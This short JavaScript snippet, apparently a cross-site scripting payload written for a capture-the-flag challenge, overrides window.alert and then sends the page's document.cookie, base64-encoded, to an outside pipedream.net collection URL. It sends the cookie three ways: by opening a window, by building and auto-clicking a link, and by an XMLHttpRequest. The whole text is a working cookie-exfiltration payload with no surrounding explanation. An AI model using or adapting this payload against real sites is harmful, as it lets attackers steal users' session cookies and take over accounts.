window.alert = function() {console.log("alert(1337)")};
var link = document.createElement("a");
var link_final = "https://eoctl0knzoys9l9.m.pipedream.net/?flag="+btoa(document.cookie)
window.open(link_final)
link.setAttribute("href", link_final);
link.setAttribute("id", "link");
link.innerHTML = "hi"
document.body.appendChild(link)
document.querySelector("#link").click()
var xhttp = new XMLHttpRequest()
xhttp.open("Get", link_final)
xhttp.send()
